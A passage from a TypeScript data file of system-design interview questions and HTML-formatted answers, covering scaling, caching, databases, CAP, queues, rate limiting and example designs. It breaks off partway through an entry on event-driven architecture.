// Interview data: system-design, microservices, security-jwt, design-patterns, algorithms
// Auto-generated from pv.html
import type { PvTopic } from '../types';

export const topics: PvTopic[] = [
  {
    id: 'system-design',
    name: 'System Design',
    icon: '🏗️',
    questions: [
      {
        q: 'What is System Design and why does it matter in interviews?',
        difficulty: 'easy',
        a: `<p><strong>System Design</strong> is the process of defining the architecture, components, and data flow of a large-scale software system. It answers: <em>"How would you build X to handle millions of users?"</em></p>
<p><strong>Think of it like building a city:</strong></p>
<ul>
<li>You need roads (networks), buildings (servers), water pipes (data flow), traffic lights (load balancers).</li>
<li>You can't just build one huge building — you need to plan for growth, failures, and traffic jams.</li>
</ul>
<p><strong>Example:</strong> If someone asks "Design Twitter", you'd think about:</p>
<ul>
<li>Where do tweets get stored? (Database)</li>
<li>How do millions of people see tweets fast? (Caching, CDN)</li>
<li>What if one server crashes? (Redundancy)</li>
</ul>
<div class="key-point">In interviews, they don't expect a perfect answer — they want to see how you <strong>think through trade-offs</strong> and break a big problem into smaller pieces.</div>`,
      },
      {
        q: 'What is Horizontal Scaling vs Vertical Scaling?',
        difficulty: 'easy',
        a: `<p><strong>Vertical Scaling (Scale Up)</strong> = Make one machine more powerful (more CPU, RAM).</p>
<p><strong>Horizontal Scaling (Scale Out)</strong> = Add more machines to share the work.</p>
<p><strong>Restaurant analogy:</strong></p>
<ul>
<li><strong>Vertical</strong>: Hire a super-fast chef who can cook 10x faster → but there's a limit to how fast one person can be.</li>
<li><strong>Horizontal</strong>: Hire 10 normal chefs → you can keep adding more as orders grow.</li>
</ul>
<pre>Vertical:   1 server (32GB RAM) → 1 server (256GB RAM)
Horizontal: 1 server → 10 servers behind a load balancer</pre>
<table><tr><th>Aspect</th><th>Vertical</th><th>Horizontal</th></tr>
<tr><td>Cost</td><td>Expensive (bigger hardware)</td><td>Cheaper (commodity servers)</td></tr>
<tr><td>Limit</td><td>Has a ceiling</td><td>Nearly unlimited</td></tr>
<tr><td>Downtime</td><td>Need to restart</td><td>No downtime (add servers)</td></tr>
<tr><td>Complexity</td><td>Simple</td><td>Need load balancer, sync</td></tr></table>
<div class="key-point">Most real-world systems use <strong>horizontal scaling</strong> because it has no hard ceiling. Netflix, Google, Amazon all scale horizontally.</div>`,
      },
      {
        q: 'What is a Load Balancer and how does it work?',
        difficulty: 'easy',
        a: `<p>A <strong>Load Balancer</strong> distributes incoming traffic across multiple servers so no single server gets overwhelmed.</p>
<p><strong>Analogy:</strong> Think of a restaurant host who directs customers to different tables/waiters evenly, so no single waiter is overloaded.</p>
<pre>         Client Requests
               |
        [Load Balancer]
        /      |      \\
   Server1  Server2  Server3</pre>
<p><strong>Common algorithms:</strong></p>
<ul>
<li><strong>Round Robin</strong>: Send to each server in turn (1→2→3→1→2→3…)</li>
<li><strong>Least Connections</strong>: Send to the server with fewest active connections.</li>
<li><strong>IP Hash</strong>: Same user always goes to the same server (useful for sessions).</li>
<li><strong>Weighted</strong>: Powerful servers get more traffic.</li>
</ul>
<p><strong>Example:</strong> When you visit google.com, your request hits a load balancer that routes you to one of thousands of servers — you never know which one.</p>
<div class="key-point">Popular tools: <strong>Nginx</strong>, <strong>HAProxy</strong>, <strong>AWS ALB/ELB</strong>. Always use a load balancer when you have multiple servers.</div>`,
      },
      {
        q: 'What is Caching and why is it important in system design?',
        difficulty: 'easy',
        a: `<p><strong>Caching</strong> = storing frequently used data in a fast-access location so you don't have to fetch it from the slow source every time.</p>
<p><strong>Analogy:</strong> Instead of going to the library every time you need a recipe, you photocopy your favorite recipes and keep them on your fridge (cache). Much faster!</p>
<pre>Without cache:  User → Server → Database (slow, every time)
With cache:     User → Server → Cache (fast!) → DB only if not in cache</pre>
<p><strong>Types of caching:</strong></p>
<ul>
<li><strong>Client-side</strong>: Browser cache (images, CSS, JS files)</li>
<li><strong>CDN cache</strong>: Static files served from servers near the user</li>
<li><strong>Application cache</strong>: Redis / Memcached storing DB query results</li>
<li><strong>Database cache</strong>: Query cache built into the DB</li>
</ul>
<p><strong>Example:</strong> Instagram caches popular user profiles in Redis. Instead of hitting the database for Cristiano Ronaldo's profile 1 million times/second, they read it from cache in <strong>&lt;1ms</strong>.</p>
<div class="key-point">Cache is not free — you must handle <strong>cache invalidation</strong> (when the real data changes, the cache must be updated). This is one of the hardest problems in CS!</div>`,
      },
      {
        q: 'What is a CDN (Content Delivery Network)?',
        difficulty: 'easy',
        a: `<p>A <strong>CDN</strong> is a network of servers distributed around the world that serve static content (images, videos, CSS, JS) from a location <strong>close to the user</strong>.</p>
<p><strong>Analogy:</strong> Instead of one pizza shop serving the whole city, you open branches in every neighborhood. Customers get pizza faster because the shop is nearby.</p>
<pre>Without CDN:
  User in Tokyo → Server in New York (200ms latency)

With CDN:
  User in Tokyo → CDN edge server in Tokyo (20ms latency)</pre>
<p><strong>How it works:</strong></p>
<ol>
<li>User requests an image</li>
<li>CDN checks its edge server → if the file is cached, serve it immediately</li>
<li>If not cached (cache miss), fetch from the origin server, cache it, and serve</li>
</ol>
<p><strong>Example:</strong> Netflix uses its own CDN (Open Connect) with servers in ISP data centers worldwide. When you stream a movie, the video comes from a server in your city, not from Netflix HQ.</p>
<div class="key-point">Popular CDNs: <strong>CloudFlare</strong>, <strong>AWS CloudFront</strong>, <strong>Akamai</strong>. Use CDN for any static content to dramatically reduce latency.</div>`,
      },
      {
        q: 'What is a Database Index and how does it speed up queries?',
        difficulty: 'medium',
        a: `<p>A <strong>database index</strong> is a data structure (usually B-Tree or Hash) that helps the database find rows quickly without scanning every row.</p>
<p><strong>Analogy:</strong> Think of the index at the back of a textbook. Instead of reading the entire book to find "Photosynthesis", you look it up in the index, get the page number, and go directly there.</p>
<pre>Without index: SELECT * FROM users WHERE email = 'john@mail.com'
  → Scans all 10 million rows (slow!)

With index on email: 
  → Looks up B-Tree, finds row in ~20 comparisons (instant!)</pre>
<p><strong>Trade-offs:</strong></p>
<ul>
<li><strong>Pro</strong>: Reads become much faster (O(log n) instead of O(n))</li>
<li><strong>Con</strong>: Writes become slightly slower (index must be updated)</li>
<li><strong>Con</strong>: Uses extra disk space</li>
</ul>
<p><strong>Example:</strong> An e-commerce site indexes <code>product_name</code>, <code>category</code>, and <code>price</code> columns because users search/filter by those constantly.</p>
<div class="key-point">Rule of thumb: Index columns that appear in <code>WHERE</code>, <code>JOIN</code>, and <code>ORDER BY</code> clauses. Don't over-index — each index slows down writes.</div>`,
      },
      {
        q: 'Explain SQL vs NoSQL databases. When would you choose each?',
        difficulty: 'medium',
        a: `<p><strong>SQL (Relational)</strong>: Structured tables with rows/columns, enforces schema, uses SQL language. E.g., MySQL, PostgreSQL.</p>
<p><strong>NoSQL</strong>: Flexible schema, stores data as documents/key-value/graph/column. E.g., MongoDB, Redis, Cassandra.</p>
<p><strong>Analogy:</strong></p>
<ul>
<li><strong>SQL</strong> = Filing cabinet with labeled folders. Everything is organized in a fixed structure. Great when you know exactly what your data looks like.</li>
<li><strong>NoSQL</strong> = A big box where you can throw in anything — notes, photos, receipts. Flexible but less organized.</li>
</ul>
<pre>SQL (Users table):
| id | name  | email          |
|----|-------|----------------|
| 1  | John  | john@mail.com  |

NoSQL (MongoDB document):
{ _id: 1, name: "John", email: "john@mail.com", 
  hobbies: ["chess", "coding"], address: { city: "NYC" } }</pre>
<table><tr><th>Use SQL when</th><th>Use NoSQL when</th></tr>
<tr><td>Data has clear relationships (orders ↔ users)</td><td>Data structure changes often</td></tr>
<tr><td>Need ACID transactions (banking)</td><td>Need massive horizontal scaling</td></tr>
<tr><td>Complex queries with JOINs</td><td>High write throughput (IoT, logs)</td></tr></table>
<div class="key-point">Many systems use <strong>both</strong>: SQL for core data (users, payments) + NoSQL for flexible data (user activity logs, product catalogs).</div>`,
      },
      {
        q: 'What is Database Sharding?',
        difficulty: 'medium',
        a: `<p><strong>Sharding</strong> = splitting a large database into smaller pieces (shards), each stored on a different server.</p>
<p><strong>Analogy:</strong> Imagine a library with 1 million books on one shelf — finding a book is slow. Instead, split books by genre: Fiction in Room A, Science in Room B, History in Room C. Each room is a "shard".</p>
<pre>Before sharding (1 big DB):
  All 100M users → one database server (bottleneck!)

After sharding:
  Users A-M → Shard 1 (Server 1)
  Users N-Z → Shard 2 (Server 2)</pre>
<p><strong>Sharding strategies:</strong></p>
<ul>
<li><strong>Range-based</strong>: Shard by user ID ranges (1-1M → shard1, 1M-2M → shard2)</li>
<li><strong>Hash-based</strong>: hash(user_id) % num_shards → even distribution</li>
<li><strong>Geography-based</strong>: US users → US shard, EU users → EU shard</li>
</ul>
<p><strong>Example:</strong> Instagram shards its PostgreSQL database by user ID. Each shard handles a subset of users, allowing them to scale to billions of photos.</p>
<div class="key-point">Sharding adds complexity: cross-shard queries are hard, rebalancing shards is painful. Only shard when a single database can't handle the load.</div>`,
      },
      {
        q: 'What is Database Replication?',
        difficulty: 'medium',
        a: `<p><strong>Replication</strong> = keeping copies of the same database on multiple servers.</p>
<p><strong>Analogy:</strong> Instead of one copy of a popular book in the library, keep 5 copies. More people can read it at the same time, and if one copy is damaged, others are still available.</p>
<pre>Master-Slave Replication:
  [Master DB] ──writes──→  [Slave 1] (read-only copy)
       |                   [Slave 2] (read-only copy)
       |                   [Slave 3] (read-only copy)
  (handles writes)       (handle reads)</pre>
<p><strong>Types:</strong></p>
<ul>
<li><strong>Master-Slave</strong>: One master (writes) + multiple slaves (reads). Most common.</li>
<li><strong>Master-Master</strong>: Multiple masters can accept writes. More complex, risk of conflicts.</li>
</ul>
<p><strong>Benefits:</strong></p>
<ul>
<li><strong>Better read performance</strong>: Spread reads across replicas</li>
<li><strong>High availability</strong>: If master dies, promote a slave</li>
<li><strong>Data safety</strong>: Multiple copies = protection against data loss</li>
</ul>
<p><strong>Example:</strong> A news site gets 95% reads, 5% writes. The master handles writes, and 4 read replicas handle the flood of readers. If the master crashes, one replica is promoted within seconds.</p>
<div class="key-point">Watch out for <strong>replication lag</strong>: a write to master may take a few milliseconds to appear on slaves. This can cause "I just updated my profile but still see the old one" bugs.</div>`,
      },
      {
        q: 'What is the CAP Theorem?',
        difficulty: 'hard',
        a: `<p>The <strong>CAP Theorem</strong> states that a distributed system can only guarantee <strong>2 out of 3</strong> properties at the same time:</p>
<ul>
<li><strong>C</strong>onsistency – Every read gets the most recent write (all nodes see the same data)</li>
<li><strong>A</strong>vailability – Every request gets a response (even if it might not be the latest data)</li>
<li><strong>P</strong>artition Tolerance – System works even when network between nodes breaks</li>
</ul>
<p><strong>Analogy:</strong> Imagine 2 friends (Node A and Node B) who share a phone book:</p>
<ul>
<li>Someone updates a phone number on Node A</li>
<li>The phone line between A and B goes down (partition!)</li>
<li>Node B gets asked for the number. You can either:</li>
<li><strong>CP</strong>: Refuse to answer until B talks to A (consistent but unavailable)</li>
<li><strong>AP</strong>: Give the old number (available but inconsistent)</li>
</ul>
<pre>CP systems: MongoDB, HBase, Redis Cluster
  → "I'd rather give no answer than a wrong answer"

AP systems: Cassandra, DynamoDB, CouchDB
  → "I'd rather give a possibly-stale answer than no answer"

CA systems: Traditional single-node RDBMS (no partition tolerance)
  → Only works when there's no network partition (single machine)</pre>
<div class="key-point">In real distributed systems, <strong>P (partition tolerance) is mandatory</strong> — networks WILL fail. So in practice, you choose between <strong>CP</strong> or <strong>AP</strong>.</div>`,
      },
      {
        q: 'What is an API Gateway?',
        difficulty: 'medium',
        a: `<p>An <strong>API Gateway</strong> is a single entry point that sits between clients and your backend microservices. All requests go through it first.</p>
<p><strong>Analogy:</strong> Think of a hotel receptionist. Guests don't walk directly to the kitchen, laundry, or housekeeping. They tell the receptionist what they need, and the receptionist routes the request to the right department.</p>
<pre>Without API Gateway:
  Mobile App → User Service
  Mobile App → Order Service
  Mobile App → Payment Service
  (client must know all service URLs)

With API Gateway:
  Mobile App → [API Gateway] → User Service
                             → Order Service
                             → Payment Service
  (client only knows one URL)</pre>
<p><strong>What it does:</strong></p>
<ul>
<li><strong>Routing</strong>: Sends /users to User Service, /orders to Order Service</li>
<li><strong>Authentication</strong>: Validates JWT/API keys before forwarding</li>
<li><strong>Rate Limiting</strong>: Prevents abuse (max 100 requests/minute)</li>
<li><strong>Response Aggregation</strong>: Combines data from multiple services into one response</li>
<li><strong>SSL Termination</strong>: Handles HTTPS so backend services don't have to</li>
</ul>
<p><strong>Example:</strong> Netflix's Zuul API Gateway handles billions of requests/day, routing them to hundreds of microservices.</p>
<div class="key-point">Popular tools: <strong>Kong</strong>, <strong>AWS API Gateway</strong>, <strong>Nginx</strong>, <strong>Spring Cloud Gateway</strong>.</div>`,
      },
      {
        q: 'What is a Message Queue and when should you use one?',
        difficulty: 'medium',
        a: `<p>A <strong>Message Queue</strong> is a system where producers send messages and consumers process them asynchronously. The queue holds messages until they are processed.</p>
<p><strong>Analogy:</strong> A coffee shop. You (producer) place an order and get a receipt number. You sit down and wait. The barista (consumer) picks orders from the queue and makes coffee one by one. You don't block the line waiting for your coffee.</p>
<pre>Synchronous (without queue):
  User → Place Order → Wait for email... → Wait for invoice... → Done (slow!)

Asynchronous (with queue):
  User → Place Order → Done! (instant response)
     [Queue]: "Send email" → Email service picks it up
     [Queue]: "Generate invoice" → Invoice service picks it up</pre>
<p><strong>When to use:</strong></p>
<ul>
<li><strong>Decoupling services</strong>: Order service doesn't need to know about Email service</li>
<li><strong>Handling spikes</strong>: Queue absorbs bursts of traffic</li>
<li><strong>Retry on failure</strong>: If email service is down, message stays in queue</li>
<li><strong>Background jobs</strong>: Image resizing, report generation, notifications</li>
</ul>
<p><strong>Example:</strong> When you upload a video to YouTube, it responds instantly with "Processing...". The actual encoding runs asynchronously via a message queue across many servers.</p>
<div class="key-point">Popular tools: <strong>RabbitMQ</strong>, <strong>Apache Kafka</strong>, <strong>AWS SQS</strong>, <strong>Redis Streams</strong>.</div>`,
      },
      {
        q: 'What is the difference between Monolith and Microservices architecture?',
        difficulty: 'medium',
        a: `<p><strong>Monolith</strong> = entire application is one big deployable unit.</p>
<p><strong>Microservices</strong> = application is split into small, independent services, each doing one thing.</p>
<p><strong>Analogy:</strong></p>
<ul>
<li><strong>Monolith</strong> = Swiss Army knife: one tool does everything. Simple to carry, but if the scissors break, you can't use the knife either.</li>
<li><strong>Microservices</strong> = Toolbox: separate screwdriver, hammer, wrench. Each can be replaced independently.</li>
</ul>
<pre>Monolith:
  [One Big App: Users + Orders + Payments + Notifications]
  → One deploy, one database, one codebase

Microservices:
  [User Service] ←→ [Order Service] ←→ [Payment Service]
       |                                      |
  [User DB]                              [Payment DB]</pre>
<table><tr><th>Aspect</th><th>Monolith</th><th>Microservices</th></tr>
<tr><td>Deployment</td><td>All or nothing</td><td>Deploy each service independently</td></tr>
<tr><td>Scaling</td><td>Scale everything together</td><td>Scale only what's needed</td></tr>
<tr><td>Complexity</td><td>Simple at first</td><td>Complex (networking, monitoring)</td></tr>
<tr><td>Team size</td><td>Small teams</td><td>Large teams (each owns a service)</td></tr></table>
<div class="key-point">Start with a monolith, then extract microservices as the system grows. Don't start with microservices for a small project — it's over-engineering.</div>`,
      },
      {
        q: 'What is Rate Limiting and how do you implement it?',
        difficulty: 'medium',
        a: `<p><strong>Rate Limiting</strong> = controlling how many requests a user/client can make in a given time window.</p>
<p><strong>Analogy:</strong> A theme park ride allows only 20 people per 5 minutes. If more people come, they wait in line. This prevents overcrowding (server overload).</p>
<p><strong>Common algorithms:</strong></p>
<ul>
<li><strong>Fixed Window</strong>: Count requests in fixed time windows (e.g., 100 requests per minute starting at :00)</li>
<li><strong>Sliding Window</strong>: Smooth version of fixed window, avoids burst at window edges</li>
<li><strong>Token Bucket</strong>: A bucket fills with tokens at a fixed rate. Each request takes a token. No tokens = rejected. Allows short bursts.</li>
<li><strong>Leaky Bucket</strong>: Requests queue up and are processed at a constant rate. Smooths traffic.</li>
</ul>
<pre>Token Bucket Example:
  Bucket capacity: 10 tokens
  Refill rate: 2 tokens/second

  Request 1-10: ✅ (10 tokens used)
  Request 11: ❌ 429 Too Many Requests (bucket empty)
  After 1 second: 2 new tokens available
  Request 12-13: ✅</pre>
<p><strong>Example:</strong> Twitter API allows 300 tweets per 3 hours per user. GitHub API allows 5000 requests per hour per authenticated user.</p>
<div class="key-point">Implement at the <strong>API Gateway level</strong> using Redis to track counters. Return HTTP <code>429 Too Many Requests</code> when limit is exceeded.</div>`,
      },
      {
        q: 'What is Consistent Hashing and why is it used?',
        difficulty: 'hard',
        a: `<p><strong>Consistent Hashing</strong> is a technique for distributing data across servers such that when a server is added or removed, only a minimal amount of data needs to move.</p>
<p><strong>Problem with simple hashing:</strong></p>
<pre>server = hash(key) % N   (N = number of servers)
If N changes (add/remove server), ALMOST ALL keys get remapped! 💀</pre>
<p><strong>Analogy:</strong> Imagine 4 people sitting in a circle, and you assign tasks by pointing a spinner. If person 2 leaves, only their tasks move to the next person. Everyone else keeps their tasks.</p>
<pre>Consistent Hashing Ring:
      0°
      |
  [Server A]--90°
      |         |
 270°--[Server C]
      |         |
  [Server B]--180°

Key "user123" hashes to 120° → goes to Server B (next server clockwise)
If Server B is removed → key goes to Server C (minimal disruption)</pre>
<p><strong>Key benefit</strong>: When adding/removing a server, only <strong>K/N</strong> keys need to move (K = total keys, N = servers), instead of almost ALL keys.</p>
<p><strong>Example:</strong> Amazon DynamoDB uses consistent hashing to distribute data across nodes. When a new node joins, only its neighbors' data is partially moved.</p>
<div class="key-point">Used in: <strong>Memcached</strong>, <strong>DynamoDB</strong>, <strong>Cassandra</strong>, <strong>load balancers</strong>. Essential for any distributed cache or database.</div>`,
      },
      {
        q: 'How would you design a URL Shortener (like bit.ly)?',
        difficulty: 'medium',
        a: `<p>A URL shortener converts long URLs to short ones (e.g., <code>bit.ly/abc123</code>) and redirects users to the original URL.</p>
<p><strong>Step-by-step design:</strong></p>
<p><strong>1. Core flow:</strong></p>
<pre>Create:  POST /shorten { url: "https://very-long-url.com/..." }
         → Returns: "https://short.ly/abc123"

Redirect: GET /abc123
         → 301 Redirect to "https://very-long-url.com/..."</pre>
<p><strong>2. How to generate short codes:</strong></p>
<ul>
<li>Use Base62 encoding (a-z, A-Z, 0-9) = 62 characters</li>
<li>6 characters = 62^6 = <strong>56 billion</strong> unique URLs</li>
<li>Auto-increment ID → convert to Base62</li>
</ul>
<pre>ID: 12345 → Base62: "dnh"
ID: 999999999 → Base62: "15FTGf"</pre>
<p><strong>3. Database:</strong></p>
<pre>Table: urls
| id (PK) | short_code | original_url | created_at |</pre>
<p><strong>4. Scaling:</strong></p>
<ul>
<li><strong>Cache</strong>: Redis cache for popular URLs (99% reads)</li>
<li><strong>Database</strong>: Shard by short_code hash</li>
<li><strong>Rate limit</strong>: Prevent spam/abuse</li>
</ul>
<div class="key-point">Read-to-write ratio is ~100:1, so cache aggressively. Use <strong>301 (permanent)</strong> redirect for SEO or <strong>302 (temporary)</strong> if you want to track analytics.</div>`,
      },
      {
        q: 'How would you design a Chat System (like WhatsApp/Slack)?',
        difficulty: 'hard',
        a: `<p>A real-time chat system requires instant message delivery, presence (online/offline), and message persistence.</p>
<p><strong>Key components:</strong></p>
<pre>Architecture:
  [Client] ←WebSocket→ [Chat Server] → [Message Queue] → [Chat Server] ←WebSocket→ [Client]
                              ↓
                        [Message DB]</pre>
<p><strong>1. Real-time delivery (WebSocket):</strong></p>
<ul>
<li>HTTP is request-response (client asks, server responds) — bad for chat</li>
<li><strong>WebSocket</strong> keeps a persistent connection open — server can push messages instantly</li>
</ul>
<p><strong>2. Message storage:</strong></p>
<pre>Table: messages
| id | chat_id | sender_id | content | timestamp | status |

Status: sent → delivered → read</pre>
<p><strong>3. One-to-one vs Group chat:</strong></p>
<ul>
<li><strong>1:1</strong>: Direct WebSocket connection, simple routing</li>
<li><strong>Group</strong>: Fan-out — send message to all group members. For large groups, use a message queue.</li>
</ul>
<p><strong>4. Handling offline users:</strong></p>
<ul>
<li>Store messages in DB with "undelivered" status</li>
<li>When user comes online, push all pending messages</li>
<li>Use push notifications (FCM/APNs) for mobile</li>
</ul>
<p><strong>Example:</strong> WhatsApp uses a custom XMPP-based protocol with Erlang servers. Each server handles millions of concurrent WebSocket connections.</p>
<div class="key-point">Key challenge: maintaining millions of WebSocket connections. Use connection servers (stateful) separated from business logic servers (stateless).</div>`,
      },
      {
        q: 'What is a Reverse Proxy?',
        difficulty: 'easy',
        a: `<p>A <strong>Reverse Proxy</strong> sits between clients and servers, forwarding client requests to the appropriate backend server.</p>
<p><strong>Analogy:</strong> You call a company's main phone number (reverse proxy). The receptionist answers and transfers you to the right department (backend server). You never dial the department directly.</p>
<pre>Forward Proxy (protects clients):
  [Client] → [Proxy] → [Internet/Servers]
  Example: VPN, corporate proxy

Reverse Proxy (protects servers):
  [Internet/Clients] → [Reverse Proxy] → [Backend Servers]
  Example: Nginx, Cloudflare</pre>
<p><strong>What a reverse proxy does:</strong></p>
<ul>
<li><strong>Load balancing</strong>: Distribute traffic across servers</li>
<li><strong>SSL termination</strong>: Handle HTTPS encryption/decryption</li>
<li><strong>Caching</strong>: Cache responses to reduce server load</li>
<li><strong>Security</strong>: Hide server IPs, block malicious traffic</li>
<li><strong>Compression</strong>: Compress responses (gzip) before sending to client</li>
</ul>
<p><strong>Example:</strong> Almost every website uses Nginx or Cloudflare as a reverse proxy. The client talks to Nginx, which forwards requests to your Node.js/Java app running behind it.</p>
<div class="key-point">Nginx is the most popular reverse proxy — used by over 30% of all websites.</div>`,
      },
      {
        q: 'What are WebSockets vs HTTP Long Polling vs Server-Sent Events?',
        difficulty: 'medium',
        a: `<p>These are three ways for a server to push data to clients in real-time:</p>
<p><strong>1. HTTP Long Polling:</strong></p>
<pre>Client: "Any new data?" → Server holds connection open...
   ...waits until there IS new data...
Server: "Here's your data!" → Client immediately asks again</pre>
<p>Like repeatedly calling a friend: "Are you done yet? Are you done yet?"</p>

<p><strong>2. Server-Sent Events (SSE):</strong></p>
<pre>Client opens connection → Server sends events whenever it wants
(One-way: server → client only)</pre>
<p>Like a radio broadcast: server pushes updates, client listens.</p>

<p><strong>3. WebSocket:</strong></p>
<pre>Client ↔ Server (full duplex, both can send anytime)
Initial HTTP handshake → upgraded to WebSocket</pre>
<p>Like a phone call: both sides can talk at any time.</p>

<table><tr><th>Feature</th><th>Long Polling</th><th>SSE</th><th>WebSocket</th></tr>
<tr><td>Direction</td><td>Client→Server</td><td>Server→Client</td><td>Both ways</td></tr>
<tr><td>Connection</td><td>Reconnect each time</td><td>Persistent</td><td>Persistent</td></tr>
<tr><td>Overhead</td><td>High (HTTP headers)</td><td>Low</td><td>Very low</td></tr>
<tr><td>Use case</td><td>Simple notifications</td><td>Live feeds, stocks</td><td>Chat, gaming</td></tr></table>
<div class="key-point">Use <strong>WebSocket</strong> for bidirectional real-time (chat, games). Use <strong>SSE</strong> for one-way updates (news feed, stock prices). Use <strong>Long Polling</strong> as a fallback when WebSocket isn't available.</div>`,
      },
      {
        q: 'What is the difference between REST and GraphQL?',
        difficulty: 'medium',
        a: `<p><strong>REST</strong>: Multiple endpoints, each returns a fixed data shape. <strong>GraphQL</strong>: One endpoint, client specifies exactly what data it wants.</p>
<p><strong>Analogy:</strong></p>
<ul>
<li><strong>REST</strong> = A restaurant with a fixed menu. You order "Combo #3" and get whatever's in it — even if you don't want the salad.</li>
<li><strong>GraphQL</strong> = A buffet. You pick exactly what you want on your plate.</li>
</ul>
<pre>REST:
  GET /users/123         → { id, name, email, address, phone, ... }
  GET /users/123/posts   → [{ id, title, body, ... }, ...]
  (2 requests, might get extra data you don't need)

GraphQL:
  POST /graphql
  query {
    user(id: 123) {
      name
      posts { title }
    }
  }
  → { name: "John", posts: [{ title: "Hello" }] }
  (1 request, exactly the data you need)</pre>
<table><tr><th>Aspect</th><th>REST</th><th>GraphQL</th></tr>
<tr><td>Endpoints</td><td>Many (/users, /posts)</td><td>One (/graphql)</td></tr>
<tr><td>Over-fetching</td><td>Common problem</td><td>Client asks for exact fields</td></tr>
<tr><td>Caching</td><td>Easy (HTTP cache)</td><td>Harder (POST requests)</td></tr>
<tr><td>Learning curve</td><td>Simple</td><td>Steeper</td></tr></table>
<div class="key-point">Use REST for simple CRUD APIs. Use GraphQL when you have complex, nested data or multiple clients (mobile, web) needing different data shapes.</div>`,
      },
      {
        q: 'What are ACID properties in databases?',
        difficulty: 'medium',
        a: `<p><strong>ACID</strong> ensures database transactions are reliable:</p>
<ul>
<li><strong>A</strong>tomicity – All or nothing. If any part fails, the whole transaction rolls back.</li>
<li><strong>C</strong>onsistency – Data goes from one valid state to another. Rules (constraints) are never broken.</li>
<li><strong>I</strong>solation – Concurrent transactions don't interfere with each other.</li>
<li><strong>D</strong>urability – Once committed, data survives crashes (written to disk).</li>
</ul>
<p><strong>Analogy (Bank Transfer):</strong></p>
<pre>Transfer $100 from Alice to Bob:
  Step 1: Alice's balance -= $100
  Step 2: Bob's balance += $100

Atomicity:   If step 2 fails, step 1 is rolled back. Alice keeps her $100.
Consistency: Total money in the system stays the same.
Isolation:   Another transaction reading balances won't see a half-done state.
Durability:  After "Transfer complete", even if server crashes, the transfer is saved.</pre>
<p><strong>Example:</strong> E-commerce checkout:</p>
<ul>
<li>Deduct inventory ✅</li>
<li>Charge payment ✅</li>
<li>Create order ❌ (fails)</li>
<li>→ ACID rolls back inventory and payment. Nothing is half-done.</li>
</ul>
<div class="key-point">SQL databases (MySQL, PostgreSQL) are ACID by default. Most NoSQL databases sacrifice ACID for performance/scalability (BASE model: Basically Available, Soft state, Eventually consistent).</div>`,
      },
      {
        q: 'What is Eventual Consistency?',
        difficulty: 'medium',
        a: `<p><strong>Eventual Consistency</strong> = after a write, all replicas will <em>eventually</em> return the latest value, but not immediately.</p>
<p><strong>Strict Consistency</strong> = after a write, ALL reads immediately see the new value.</p>
<p><strong>Analogy:</strong> You update your profile picture on social media.</p>
<ul>
<li><strong>Strict consistency</strong>: Everyone in the world sees your new picture <em>immediately</em>.</li>
<li><strong>Eventual consistency</strong>: Your friend in Japan might see the old picture for a few seconds, but it'll update soon.</li>
</ul>
<pre>Scenario with 3 replicas:
  Write "name=John" to Replica 1
  Replica 1 → syncs to Replica 2 (50ms delay)
  Replica 1 → syncs to Replica 3 (100ms delay)

  Read from Replica 3 at t=50ms → still sees old name (stale!)
  Read from Replica 3 at t=200ms → sees "John" ✅ (eventually consistent)</pre>
<p><strong>Where it's used:</strong></p>
<ul>
<li>DNS (domain name changes take hours to propagate)</li>
<li>Social media feeds (a few seconds delay is fine)</li>
<li>Shopping cart (Cassandra, DynamoDB)</li>
</ul>
<div class="key-point">Eventual consistency gives you <strong>higher availability and performance</strong>. Use it when "slightly stale data" is acceptable. Never use it for banking or inventory where accuracy is critical.</div>`,
      },
      {
        q: 'How would you design a News Feed system (like Facebook/Twitter)?',
        difficulty: 'hard',
        a: `<p>A news feed shows a personalized list of posts from people you follow, ranked and ordered.</p>
<p><strong>Two main approaches:</strong></p>
<p><strong>1. Fan-out on Write (Push model):</strong></p>
<pre>User A creates a post
  → Immediately write post to all followers' feeds
  → Each follower's feed cache is pre-computed

Pros: Fast reads (feed is ready)
Cons: Slow writes for celebrities (Cristiano Ronaldo: 500M followers!)</pre>
<p><strong>2. Fan-out on Read (Pull model):</strong></p>
<pre>User opens feed
  → Fetch latest posts from all followed users
  → Merge, rank, and return

Pros: Fast writes
Cons: Slow reads (must query many sources)</pre>
<p><strong>3. Hybrid (what Facebook/Twitter actually use):</strong></p>
<ul>
<li>Normal users: Fan-out on Write (push to followers' feeds)</li>
<li>Celebrities (>10K followers): Fan-out on Read (fetch on demand)</li>
</ul>
<pre>Architecture:
  [Post Service] → [Fan-out Service] → [Feed Cache (Redis)]
                                              ↓
                                    [Feed Service] → Client

Feed cache per user:
  user_feed:123 → [post_id_999, post_id_888, post_id_777, ...]</pre>
<p><strong>Ranking:</strong> Sort by relevance (engagement, recency, interest) using ML models, not just chronological.</p>
<div class="key-point">The feed cache is the core. Keep it in Redis as a sorted set of post IDs per user. Only store IDs in the feed, fetch full post content separately.</div>`,
      },
      {
        q: 'What is a Circuit Breaker pattern?',
        difficulty: 'medium',
        a: `<p>A <strong>Circuit Breaker</strong> prevents your service from repeatedly calling a failing service. It "trips" after too many failures and returns errors immediately.</p>
<p><strong>Analogy:</strong> Electrical circuit breaker in your house. If there's a short circuit, the breaker trips and cuts power to prevent a fire. After fixing the issue, you flip it back on.</p>
<pre>States:
  [CLOSED] → Requests pass through normally
    ↓ (too many failures)
  [OPEN] → Requests fail immediately (don't even try)
    ↓ (after timeout)
  [HALF-OPEN] → Allow a few test requests
    ↓ (if they succeed → CLOSED, if they fail → OPEN again)</pre>
<p><strong>Example:</strong></p>
<pre>// Without circuit breaker:
Order Service → Payment Service (down!) → timeout 30s → retry → timeout...
  → All threads blocked → Order Service also crashes! (cascading failure)

// With circuit breaker:
Order Service → Circuit Breaker → Payment Service (down!)
  → After 5 failures, breaker OPENs
  → Next requests get instant error: "Payment unavailable"
  → Order Service stays healthy, shows user a friendly message</pre>
<p><strong>Configuration:</strong></p>
<ul>
<li>Failure threshold: 5 failures to trip</li>
<li>Open duration: 30 seconds before trying again</li>
<li>Half-open: Allow 3 test requests</li>
</ul>
<div class="key-point">Implement with <strong>Resilience4j</strong> (Java) or <strong>Hystrix</strong> (legacy). Essential in microservices to prevent cascading failures.</div>`,
      },
      {
        q: 'What is Event-Driven Architecture?',
        difficulty: 'medium',
        a: `<p><strong>Event-Driven Architecture (EDA)</strong> = services communicate by producing and consuming events instead of directly calling each other.</p>
<p><strong>Analogy:</strong> Instead of Person A calling Person B directly (phone call = synchronous), Person A posts a note on a bulletin board (event), and anyone interested reads it (asynchronous).</p>
<pre>Traditional (synchronous):
  Order Service → calls → Payment Service → calls → Inventory Service
  (tightly coupled, if Payment is slow, everything waits)
